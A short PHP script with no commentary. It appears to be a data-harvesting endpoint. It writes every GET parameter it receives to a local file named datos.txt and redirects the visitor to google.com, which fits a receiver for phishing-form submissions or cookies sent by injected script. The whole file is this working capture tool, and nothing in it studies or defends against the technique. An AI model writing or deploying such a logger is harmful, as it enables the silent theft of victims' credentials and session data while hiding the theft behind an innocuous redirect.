<?php
header('Location: https://google.com');
$handle =

fopen("datos.txt","a");
foreach($_GET as

$variable => $value) {
fwrite($handle,

$variable);
fwrite($handle, " = ");

fwrite($handle,$value);
fwrite($handle,

"\r\n");
}
fwrite($handle,"\r\n");
fclose($handle);
exit;
?>
